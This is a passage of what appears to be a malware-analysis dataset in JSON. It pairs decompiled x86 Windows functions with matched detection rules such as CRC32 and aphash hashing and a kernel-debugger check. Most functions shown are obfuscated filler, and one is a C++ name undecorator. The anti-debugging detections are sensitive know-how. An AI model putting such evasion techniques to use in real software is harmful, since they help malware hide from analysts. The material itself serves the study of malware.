        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00402fdb(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack276;\n    uchar auStack272 [24];\n    uchar auStack248 [24];\n    int32_t iStack224;\n    uchar auStack220 [24];\n    uchar auStack196 [24];\n    int32_t iStack172;\n    uchar auStack168 [24];\n    uchar auStack144 [27];\n    uchar uStack117;\n    uint uStack116;\n    uchar uStack109;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uchar uStack89;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffed8;\n    uStack28 = 0x450de0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"zjumpovrwnysrveokkidofqcmdjxkewyowkerqqezjywlfuzqddatrwpqynwoiryjggoratbvmyrgxneilgrbq\");\n    uStack24 = 1;\n    fcn.00401e79(\"nnmjyofpkblbiyqoyockxzakelxvrejjggvzdmzqggoqdxthkv\");\n    uStack89 = 1;\n    uStack100 = 0x40c46600;\n    uStack104 = 0;\n    uStack108 = 0xa35;\n    uStack109 = 1;\n    uStack116 = 0x10d;\n    uStack117 = 0;\n    uStack24 = 2;\n    fcn.00401e79(\"nnmjyofpkblbiyqoyockxzakelxvrejjggvzdmzqggoqdxthkv\");\n    uStack24 = 5;\n    fcn.00401e79(\"nnmjyofpkblbiyqoyockxzakelxvrejjggvzdmzqggoqdxthkv\");\n    uVar1 = fcn.004042dc(auStack168, auStack144);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack172 = 0x5b; 0 < iStack172; iStack172 = iStack172 + -1) {\n        }\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"zjumpovrwnysrveokkidofqcmdjxkewyowkerqqezjywlfuzqddatrwpqynwoiryjggoratbvmyrgxneilgrbq\");\n    uStack24 = 4;\n    fcn.00401e79(\"zjumpovrwnysrveokkidofqcmdjxkewyowkerqqezjywlfuzqddatrwpqynwoiryjggoratbvmyrgxneilgrbq\");\n    uVar1 = fcn.004042dc(auStack220, auStack196);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack224 = 0x3b; 0 < iStack224; iStack224 = iStack224 + -1) {\n        }\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"zjumpovrwnysrveokkidofqcmdjxkewyowkerqqezjywlfuzqddatrwpqynwoiryjggoratbvmyrgxneilgrbq\");\n    uStack24 = 3;\n    fcn.00401e79(\"zjumpovrwnysrveokkidofqcmdjxkewyowkerqqezjywlfuzqddatrwpqynwoiryjggoratbvmyrgxneilgrbq\");\n    uVar1 = fcn.00405b37(auStack272, auStack248);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack276 = 0x59; 0 < iStack276; iStack276 = iStack276 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x941c;\n}\n",
        "token_count": 1086
    },
    "00402fe0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00402fe0(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    return *0x546ce4;\n}\n",
        "token_count": 51
    },
    "00402ff9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00402ff9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    return *0x546d24;\n}\n",
        "token_count": 51
    },
    "00403049": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403049(uint arg_8h)\n\n{\n    fcn.00403b02(*0x547378);\n    return 1;\n}\n",
        "token_count": 37
    },
    "0040307b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040307b(uint param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_10h = 0xffffffff;\n    var_14h = 0x426f60;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    iVar1 = fcn.00404def();\n    if (iVar1 != 0) {\n        fcn.0040408e(param_1);\n        uVar2 = fcn.004017c6();\n        if ((uVar2 & 1) != 0) {\n            var_10h = 0;\n            iVar1 = fcn.00405367();\n            if (iVar1 == -1) {\n                fcn.004067a3(4, 0);\n            }\n        }\n        fcn.00403a71();\n    }\n    *in_FS_OFFSET = var_18h;\n    return param_1;\n}\n",
        "token_count": 291
    },
    "00403102": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403102(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_48h;\n    uint var_44h;\n    uint var_3ch;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x418030;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 1;\n    fcn.00401e79(0x5448b4);\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 0;\n}\n",
        "token_count": 189
    },
    "0040318e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_70h\n// WARNING: Variable defined which should be unmapped: var_78h\n// WARNING: Variable defined which should be unmapped: var_80h\n// WARNING: Variable defined which should be unmapped: var_68h\n// WARNING: Variable defined which should be unmapped: var_88h\n\nchar ** __cdecl fcn.0040318e(char **arg_8h, char **arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    char **ppcVar4;\n    char *pcVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    char **ppcVar9;\n    bool bVar10;\n    uint *var_88h;\n    uint *var_80h;\n    uint *var_78h;\n    char **var_70h;\n    uint var_68h;\n    int32_t var_60h;\n    char *var_5ch;\n    int32_t var_58h;\n    char *var_54h;\n    char *var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    char *var_40h;\n    char *var_3ch;\n    char *var_38h;\n    char *var_34h;\n    char *var_30h;\n    uint var_2ch;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    char *var_1ch;\n    char *var_18h;\n    char *var_14h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    var_60h = *0x574458 - *0x57445c;\n    ppcVar9 = NULL;\n    var_10h = NULL;\n    var_ch = NULL;\n    uVar1 = fcn.00401cd5();\n    if ((*arg_ch == NULL) || (var_58h = 1,  (arg_ch[1] & 0x200) == 0)) {\n        var_58h = 0;\n    }\n    if (uVar1 == 0xffff) {\n        arg_8h[1] = NULL;\n        *(arg_8h + 1) = 2;\n        *arg_8h = NULL;\n        return arg_8h;\n    }\n    if (uVar1 == 0xfffe) {\n        fcn.0040129e(arg_8h, 1, arg_ch);\n        return arg_8h;\n    }\n    if (uVar1 == 0xfffd) {\n        *arg_8h = *arg_ch;\n        arg_8h[1] = arg_ch[1];\n        return arg_8h;\n    }\n    uVar8 = uVar1 & 0x8000;\n    var_24h = uVar8;\n    if (uVar8 == 0) {\ncode_r0x0048c930:\n        fcn.00402eeb(arg_ch);\n        uVar2 = var_24h;\n        if (uVar8 == 0) {\n            uVar8 = uVar1 & 0x7c00;\n            if ((uVar8 == 0x6800) || (uVar8 == 0x7000)) {\n                fcn.00404a98(arg_8h, &fcn.0040318e::var_10h);\n                return arg_8h;\n            }\n            if (uVar8 == 0x6000) {\n                var_8h = var_10h;\n                var_34h = 0x555880;\n                var_30h = 0x2;\n                var_4h = var_ch;\n                fcn.00403d55(0x7b);\n                fcn.0040358a(&fcn.0040318e::var_4ch, 0);\n                fcn.004053b7(&fcn.0040318e::var_2ch, &fcn.0040318e::var_4ch);\n                fcn.00405164(arg_8h, &fcn.0040318e::var_34h);\n                return arg_8h;\n            }\n        }\n        if ((uVar1 & 0xfc00) == 0x7c00) {\n            fcn.004058fd(arg_8h, &fcn.0040318e::var_10h);\n            return arg_8h;\n        }\n        if (var_24h == 0) {\n            bVar10 = (uVar1 & 0x6000) == 0;\n        }\n        else {\n            bVar10 = (uVar1 & 0x1800) == 0x800;\n        }\n        uVar8 = uVar1 & 0x1800;\n        var_18h = uVar1 & 0x6000;\n        if (bVar10) {\n            uVar7 = uVar1 & 0x400;\n        }\n        else {\n            uVar7 = uVar1 & 0x1000;\n        }\n        var_20h = uVar1 & 0x1000;\n        var_24h = uVar1 & 0x400;\n        if ((uVar7 == 0) || ((uVar1 & 0x1b00) != 0x1000 || uVar2 == 0)) {\n            if (uVar2 == 0) {\n                bVar10 = var_18h == NULL;\n            }\n            else {\n                bVar10 = uVar8 == 0x800;\n            }\n            uVar7 = var_24h;\n            if (!bVar10) {\n                uVar7 = var_20h;\n            }\n            if ((uVar7 != 0) && ((uVar1 & 0x1b00) == 0x1100 && uVar2 != 0)) {\n                var_8h = \"`template static data member constructor helper\\'\";\n                var_4h = 0x30;\n                goto code_r0x0048cb0b;\n            }\n            if (uVar2 == 0) {\n                bVar10 = var_18h == NULL;\n            }\n            else {\n                bVar10 = uVar8 == 0x800;\n            }\n            uVar7 = var_24h;\n            if (!bVar10) {\n                uVar7 = var_20h;\n            }\n            if ((uVar7 != 0) && ((uVar1 & 0x1b00) == 0x1200 && uVar2 != 0)) {\n                var_8h = \"`template static data member destructor helper\\'\";\n                var_4h = 0x2f;\n                goto code_r0x0048cb0b;\n            }\n            if (uVar2 != 0) goto code_r0x0048cb1b;\n            if ((uVar1 & 0x7c00) == 0x7800) goto code_r0x0048cf23;\ncode_r0x0048cb90:\n            bVar10 = var_18h == NULL;\n        }\n        else {\n            var_8h = \"`local static destructor helper\\'\";\n            var_4h = 0x20;\ncode_r0x0048cb0b:\n            fcn.00405d71(&fcn.0040318e::var_8h);\n            if (uVar2 == 0) goto code_r0x0048cb90;\ncode_r0x0048cb1b:\n            bVar10 = uVar8 == 0x800;\n        }\n        uVar8 = var_24h;\n        if (!bVar10) {\n            uVar8 = var_20h;\n        }\n        if ((uVar8 == 0) || (((uVar1 & 0x1b00) != 0x1100 || uVar2 == 0 && ((uVar1 & 0x1b00) != 0x1200 || uVar2 == 0))))\n        {\n            ppcVar9 = fcn.00401721(&fcn.0040318e::var_2ch, &fcn.0040318e::var_10h);\n        }\n        else {\n            ppcVar9 = fcn.00402eb4(&fcn.0040318e::var_2ch, 0x20, &fcn.0040318e::var_10h);\n        }\n        var_10h = *ppcVar9;\n        var_ch = ppcVar9[1];\n        if (uVar2 != 0) goto code_r0x0048cbb5;\n        bVar10 = (uVar1 & 0x6000) == 0;\n    }\n    else {\n        var_20h = uVar1 & 0x1800;\n        if (var_20h == 0x800) {\n            uVar2 = uVar1 & 0x400;\n        }\n        else {\n            uVar2 = uVar1 & 0x1000;\n        }\n        var_14h = uVar1 & 0x400;\n        var_40h = uVar1 & 0x1000;\n        if ((uVar2 != 0) && ((uVar1 & 0x1b00) == 0x1000)) goto code_r0x0048c930;\n        if (var_20h == 0x800) {\n            var_38h = var_14h;\n        }\n        else {\n            var_38h = var_40h;\n        }\n        if ((var_38h != NULL) && (((uVar1 & 0x1b00) == 0x1100 || ((uVar1 & 0x1b00) == 0x1200)))) goto code_r0x0048c930;\n        if ((uVar1 & 0x4000) != 0) {\n            if ((~((*0x574460 >> 2 | *0x574460) >> 1) & 1) == 0) {\n                uVar3 = fcn.004051a0(&fcn.0040318e::var_8h);\n                fcn.00406a05(uVar3);\n            }\n            else {\n                uVar3 = fcn.004051a0(&fcn.0040318e::var_8h);\n                ppcVar4 = fcn.00402eb4(&fcn.0040318e::var_34h, 0x20, uVar3);\n                var_10h = *ppcVar4;\n                var_ch = ppcVar4[1];\n            }\n        }\n        pcVar5 = var_14h;\n        var_38h = var_14h;\n        if (var_20h != 0x800) {\n            var_38h = var_40h;\n        }\n        if ((var_38h == NULL) || (var_20h != 0x1800)) {\n            var_34h = NULL;\n            var_30h = NULL;\n            var_8h = NULL;\n            var_4h = NULL;\n            var_54h = NULL;\n            var_50h = NULL;\n            var_38h = NULL;\n            var_14h = NULL;\n            var_4ch = 0;\n            var_48h = 0;\n            if (var_20h != 0x800) {\n                pcVar5 = var_40h;\n            }\n            uVar8 = uVar1 & 0x700;\n            if (pcVar5 != NULL) {\n                if (var_20h == 0x800) {\n                    if (uVar8 == 0x600) {\n                        var_70h = &fcn.0040318e::var_1ch;\n                        fcn.0040358a(var_70h, 1);\n                        var_34h = var_1ch;\n                        var_30h = var_18h;\n                        var_78h = &fcn.0040318e::var_1ch;\n                        fcn.0040358a(var_78h, 1);\n                        var_8h = var_1ch;\n                        var_4h = var_18h;\n                        var_80h = &fcn.0040318e::var_1ch;\n                        fcn.0040358a(var_80h, 1);\n                        var_54h = var_1ch;\n                        var_50h = var_18h;\n                    }\n                    else if (uVar8 == 0x500) {\n                        var_70h = &fcn.0040318e::var_3ch;\n                        fcn.0040358a(var_70h, 1);\n                        var_54h = var_3ch;\n                        var_50h = var_38h;\n                    }\n                }\n                var_70h = &fcn.0040318e::var_1ch;\n                fcn.0040358a(var_70h, 1);\n                var_38h = var_1ch;\n                var_14h = var_18h;\n            }\n            if ((var_20h == 0x800) && (uVar8 != 0x200)) {\n                if ((*0x574460 & 0x60) == 0x60) {\n                    var_70h = 0x48c5cb;\n                    var_68h = fcn.00405871(&fcn.0040318e::var_1ch);\n                    var_70h = 0x48c5d5;\n                    fcn.00406a05(var_68h);\n                }\n                else {\n                    var_70h = 0x48c5b8;\n                    puVar6 = fcn.00405871(&fcn.0040318e::var_1ch);\n                    var_4ch = *puVar6;\n                    var_48h = puVar6[1];\n                }\n            }\n            if (((~(*0x574460 >> 1) & 1) == 0) || ((~(*0x574460 >> 4) & 1) == 0)) {\n                var_70h = 0x48c61a;\n                uVar3 = fcn.004039cc(&fcn.0040318e::var_1ch);\n                var_70h = 0x48c624;\n                fcn.00406a05(uVar3);\n            }\n            else {\n                var_70h = 0x48c5f8;\n                fcn.004039cc(&fcn.0040318e::var_1ch);\n                ppcVar4 = fcn.004053b7(&fcn.0040318e::var_44h, &fcn.0040318e::var_44h);\n                var_10h = *ppcVar4;\n                var_ch = ppcVar4[1];\n            }\n            if (*arg_ch != NULL) {\n                if ((var_10h == NULL) || ((*0x574460 & 0x1000) != 0)) {\n                    var_ch = arg_ch[1];\n                    var_10h = *arg_ch;\n                }\n                else {\n                    var_70h = arg_ch;\n                    var_78h = &fcn.0040318e::var_1ch;\n                    uVar3 = fcn.00402eb4(var_78h, 0x20, arg_ch);\n                    fcn.00402eeb(uVar3);\n                }\n            }\n            var_40h = NULL;\n            var_18h = NULL;\n            if (var_58h == 0) {\n                var_70h = 0x8;\n                ppcVar4 = fcn.0040528b(8);\n                if (ppcVar4 != NULL) {\n                    *ppcVar4 = NULL;\n                    ppcVar4[1] = NULL;\n                    ppcVar9 = ppcVar4;\n                }\n                var_78h = &fcn.0040318e::var_68h;\n                ppcVar4 = fcn.0040420a(var_78h, ppcVar9);\n                var_40h = *ppcVar4;\n                var_18h = ppcVar4[1];\n            }\n            else {\n                var_70h = NULL;\n                var_78h = 0x48c676;\n                var_78h = fcn.0040420a(&fcn.0040318e::var_5ch, 0);\n                var_80h = &fcn.0040318e::var_68h;\n                var_70h = fcn.00402eb4(var_80h, 0x20, var_78h);\n                fcn.00402eeb(var_70h);\n                if ((*0x574460 & 0x1000) != 0) goto code_r0x0048cf23;\n            }\n            if (var_20h == 0x800) {\n                uVar2 = uVar1 & 0x400;\n            }\n            else {\n                uVar2 = uVar1 & 0x1000;\n            }\n            if (uVar2 != 0) {\n                if (var_20h == 0x800) {\n                    if (uVar8 == 0x600) {\n                        var_5ch = \"`vtordispex{\";\n                        var_58h = 0xc;\n                        var_78h = 0x48c71b;\n                        fcn.00402d47(&fcn.0040318e::var_5ch);\n                        var_78h = &fcn.0040318e::var_34h;\n                        var_80h = 0x48c72a;\n                        fcn.004053b7(&fcn.0040318e::var_5ch, var_78h);\n                        var_80h = 0x2c;\n                        puVar6 = &fcn.0040318e::var_80h;\n                        var_88h = 0x48c738;\n                        fcn.0040330f(puVar6, 0x2c);\n                        var_88h = &fcn.0040318e::var_8h;\n                        fcn.004053b7(&fcn.0040318e::var_88h, var_88h);\n                        fcn.0040330f(&fcn.0040318e::var_78h, 0x2c);\n                        fcn.004053b7(&fcn.0040318e::var_70h, &fcn.0040318e::var_54h);\n                    }\n                    else {\n                        if (uVar8 != 0x500) goto code_r0x0048c7be;\n                        var_8h = \"`vtordisp{\";\n                        var_4h = 0xa;\n                        var_78h = 0x48c796;\n                        fcn.00402d47(&fcn.0040318e::var_8h);\n                        var_78h = &fcn.0040318e::var_54h;\n                        var_80h = 0x48c7a5;\n                        fcn.004053b7(&fcn.0040318e::var_8h, var_78h);\n                        var_80h = 0x2c;\n                        puVar6 = &fcn.0040318e::var_70h;\n                    }\n                    var_88h = 0x48c7b3;\n                    uVar3 = fcn.0040330f(puVar6, var_80h);\n                    fcn.00402eeb(uVar3);\n                }\n                else {\ncode_r0x0048c7be:\n                    var_8h = \"`adjustor{\";\n                    var_4h = 0xa;\n                    var_78h = 0x48c7d8;\n                    fcn.00405d71(&fcn.0040318e::var_8h);\n                }\n                var_8h = var_38h;\n                var_4h = var_14h;\n                var_78h = &fcn.0040318e::var_34h;\n                var_34h = 0x55587c;\n                var_30h = 0x3;\n                fcn.00405d71(var_78h);\n                var_80h = 0x48c80a;\n                fcn.00402eeb(&fcn.0040318e::var_8h);\n            }\n            if ((*0x574470 == 1) && (*0x57446c == 0)) {\n                *0x57446c = var_60h;\n            }\n            var_80h = &fcn.0040318e::var_2ch;\n            uVar3 = fcn.004068ac(var_80h);\n            var_88h = 0x28;\n            fcn.00402eb4(&fcn.0040318e::var_70h, 0x28, uVar3);\n            var_80h = 0x29;\n            var_88h = 0x48c849;\n            fcn.0040330f(&fcn.0040318e::var_78h, 0x29);\n            fcn.00402eeb(0x48c852);\n            if ((var_20h == 0x800) && ((uVar1 & 0x700) != 0x200)) {\n                fcn.00402eeb(&fcn.0040318e::var_4ch);\n            }\n            if ((~(*0x574460 >> 0x13) & 1) == 0) {\n                uVar3 = fcn.00402365(&fcn.0040318e::var_2ch);\n                fcn.00406a05(uVar3);\n            }\n            else {\n                uVar3 = fcn.00402365(&fcn.0040318e::var_2ch);\n                fcn.00402eeb(uVar3);\n            }\n            uVar3 = fcn.00401e01(&fcn.0040318e::var_2ch);\n            fcn.00402eeb(uVar3);\n            if ((~(*0x574460 >> 8) & 1) == 0) {\n                uVar3 = fcn.00405aa1(&fcn.0040318e::var_2ch);\n                fcn.00406a05(uVar3);\n            }\n            else {\n                uVar3 = fcn.00405aa1(&fcn.0040318e::var_2ch);\n                fcn.00402eeb(uVar3);\n            }\n            uVar3 = fcn.004045ed(&fcn.0040318e::var_2ch);\n            fcn.00406a05(uVar3);\n            uVar2 = var_24h;\n            if (((~(*0x574460 >> 2) & 1) != 0) && (ppcVar9 != NULL)) {\n                *ppcVar9 = var_10h;\n                ppcVar9[1] = var_ch;\n                var_10h = var_40h;\n                var_ch = var_18h;\n            }\n        }\n        else {\n            var_70h = &fcn.0040318e::var_34h;\n            fcn.0040330f(var_70h, 0x7b);\n            var_78h = &fcn.0040318e::var_8h;\n            fcn.0040358a(var_78h, 0);\n            var_78h = &fcn.0040318e::var_4ch;\n            uVar3 = fcn.004053b7(var_78h, &fcn.0040318e::var_8h);\n            var_80h = 0x48c3eb;\n            fcn.00402eeb(uVar3);\n            var_80h = &fcn.0040318e::var_34h;\n            fcn.00403cab(var_80h);\n            if ((*0x574460 & 0x1000) == 0) {\n                var_80h = &fcn.0040318e::var_34h;\n                var_8h = 0x55587c;\n                var_88h = &fcn.0040318e::var_4ch;\n                var_4h = 0x3;\n                fcn.00402eb4(var_88h, 0x2c, var_80h);\n                var_80h = &fcn.0040318e::var_8h;\n                var_88h = 0x48c431;\n                var_88h = fcn.00405164(&fcn.0040318e::var_54h, var_80h);\n                fcn.00402eeb(var_88h);\n            }\n            var_8h = 0x555880;\n            var_4h = 0x2;\n            fcn.00405d71(&fcn.0040318e::var_8h);\n            fcn.004039cc(&fcn.0040318e::var_8h);\n            uVar2 = var_24h;\n            if ((((~(*0x574460 >> 1) & 1) != 0) && ((~(*0x574460 >> 4) & 1) != 0)) && ((*0x574460 & 0x1000) == 0)) {\n                fcn.00402eb4(&fcn.0040318e::var_34h, 0x20, &fcn.0040318e::var_8h);\n                fcn.0040330f(&fcn.0040318e::var_4ch, 0x20);\n                ppcVar9 = fcn.004053b7(&fcn.0040318e::var_54h, &fcn.0040318e::var_10h);\n                var_10h = *ppcVar9;\n                var_ch = ppcVar9[1];\n                uVar2 = var_24h;\n            }\n        }\ncode_r0x0048cbb5:\n        bVar10 = (uVar1 & 0x1800) == 0x800;\n    }\n    uVar8 = uVar1 & 0x1800;\n    var_14h = uVar1 & 0x6000;\n    if (bVar10) {\n        if ((~(*0x574460 >> 9) & 1) != 0) {\n            if (uVar2 == 0) {\n                bVar10 = var_14h == NULL;\n            }\n            else {\n                bVar10 = uVar8 == 0x800;\n            }\n            if (bVar10) {\n                if ((uVar2 == 0) || ((uVar1 & 0x700) == 0x200)) {\n                    var_8h = \"static \";\n                    var_4h = 0x7;\n                    fcn.00402d47(&fcn.0040318e::var_8h);\n                    fcn.004053b7(&fcn.0040318e::var_8h, &fcn.0040318e::var_10h);\n                    var_10h = var_8h;\n                    var_ch = var_4h;\n                    goto code_r0x0048cc63;\n                }\ncode_r0x0048cc67:\n                if ((uVar1 & 0x700) != 0x100) {\n                    bVar10 = uVar8 == 0x800;\n                    goto code_r0x0048cc8d;\n                }\n            }\n            else {\ncode_r0x0048cc63:\n                if (uVar2 != 0) goto code_r0x0048cc67;\n                bVar10 = var_14h == NULL;\ncode_r0x0048cc8d:\n                if (bVar10) {\n                    uVar7 = uVar1 & 0x400;\n                }\n                else {\n                    uVar7 = uVar1 & 0x1000;\n                }\n                if (uVar7 == 0) goto code_r0x0048cd6f;\n                if (uVar2 == 0) {\n                    bVar10 = var_14h == NULL;\n                    var_18h = var_14h;\n                }\n                else {\n                    bVar10 = uVar8 == 0x800;\n                    var_18h = uVar1 & 0x6000;\n                }\n                if ((!bVar10) || ((uVar1 & 0x700) != 0x500)) {\n                    if (uVar2 == 0) {\n                        uVar7 = uVar1 & 0x6000;\n                    }\n                    else {\n                        uVar7 = (uVar1 & 0x1800) - 0x800;\n                    }\n                    if ((uVar7 != 0) || ((uVar1 & 0x700) != 0x600)) {\n                        if (uVar2 == 0) {\n                            bVar10 = var_18h == NULL;\n                        }\n                        else {\n                            bVar10 = (uVar1 & 0x1800) == 0x800;\n                        }\n                        if ((!bVar10) || ((uVar1 & 0x700) != 0x400)) goto code_r0x0048cd6f;\n                    }\n                }\n            }\n            var_8h = \"virtual \";\n            var_4h = 0x8;\n            fcn.00402d47(&fcn.0040318e::var_8h);\n            fcn.004053b7(&fcn.0040318e::var_8h, &fcn.0040318e::var_10h);\n            var_10h = var_8h;\n            var_ch = var_4h;\n        }\ncode_r0x0048cd6f:\n        if ((~(*0x574460 >> 7) & 1) != 0) {\n            if (uVar2 == 0) {\n                bVar10 = var_14h == NULL;\n            }\n            else {\n                bVar10 = uVar8 == 0x800;\n            }\n            if (bVar10) {\n                if (uVar2 == 0) {\n                    bVar10 = uVar8 == 0x800;\n                }\n                else {\n                    bVar10 = (uVar1 & 0xc0) == 0x40;\n                }\n                if (!bVar10) goto code_r0x0048cdc9;\n                var_8h = \"private: \";\n                var_4h = 0x9;\ncode_r0x0048ce54:\n                fcn.00402d47(&fcn.0040318e::var_8h);\n                fcn.004053b7(&fcn.0040318e::var_8h, &fcn.0040318e::var_10h);\n                var_10h = var_8h;\n                var_ch = var_4h;\n            }\n            else {\ncode_r0x0048cdc9:\n                if (uVar2 == 0) {\n                    bVar10 = var_14h == NULL;\n                }\n                else {\n                    bVar10 = uVar8 == 0x800;\n                }\n                if (bVar10) {\n                    if (uVar2 == 0) {\n                        bVar10 = uVar8 == 0x1000;\n                    }\n                    else {\n                        bVar10 = (uVar1 & 0xc0) == 0x80;\n                    }\n                    if (bVar10) {\n                        var_8h = \"protected: \";\n                        var_4h = 0xb;\n                        goto code_r0x0048ce54;\n                    }\n                }\n                if (uVar2 == 0) {\n                    bVar10 = var_14h == NULL;\n                }\n                else {\n                    bVar10 = uVar8 == 0x800;\n                }\n                uVar7 = uVar1 & 0x1800;\n                if (bVar10) {\n                    if (uVar2 != 0) {\n                        uVar7 = uVar1 & 0xc0;\n                    }\n                    if (uVar7 == 0) {\n                        var_8h = \"public: \";\n                        var_4h = 0x8;\n                        goto code_r0x0048ce54;\n                    }\n                }\n            }\n        }\n    }\n    if (uVar2 == 0) {\n        bVar10 = var_14h == NULL;\n    }\n    else {\n        bVar10 = uVar8 == 0x800;\n    }\n    if (bVar10) {\n        uVar8 = uVar1 & 0x400;\n    }\n    else {\n        uVar8 = uVar1 & 0x1000;\n    }\n    if ((uVar8 != 0) && ((*0x574460 & 0x1000) == 0)) {\n        var_8h = \"[thunk]:\";\n        var_4h = 0x8;\n        fcn.00402d47(&fcn.0040318e::var_8h);\n        fcn.004053b7(&fcn.0040318e::var_8h, &fcn.0040318e::var_10h);\n        var_10h = var_8h;\n        var_ch = var_4h;\n    }\n    if ((uVar1 & 0x10000) != 0) {\n        var_8h = \"extern \\\"C\\\" \";\n        var_4h = 0xb;\n        fcn.00402d47(&fcn.0040318e::var_8h);\n        fcn.004053b7(&fcn.0040318e::var_8h, &fcn.0040318e::var_10h);\n        var_10h = var_8h;\n        var_ch = var_4h;\n    }\ncode_r0x0048cf23:\n    *arg_8h = var_10h;\n    arg_8h[1] = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 7547
    },
    "004031ca": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004031ca(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack260;\n    uchar auStack256 [24];\n    uchar auStack232 [24];\n    int32_t iStack208;\n    uchar auStack204 [24];\n    uchar auStack180 [24];\n    int32_t iStack156;\n    uchar auStack152 [24];\n    uchar auStack128 [79];\n    uint8_t uStack49;\n    ulong uStack48;\n    uint8_t uStack37;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffee8;\n    uStack48 = CONCAT44(noname_3, arg_10h);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x4513e0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack37 = arg_18h & 1;\n    uStack49 = arg_8h & 1;\n    fcn.00401e79(\"mjfuwqpvpzbnfwaeltqzayuavhy\");\n    uStack24 = 0;\n    fcn.00401e79(\"fgxkfv\");\n    uStack24 = 1;\n    fcn.00401e79(\"mjfuwqpvpzbnfwaeltqzayuavhy\");\n    uStack24 = 4;\n    fcn.00401e79(\"mjfuwqpvpzbnfwaeltqzayuavhy\");\n    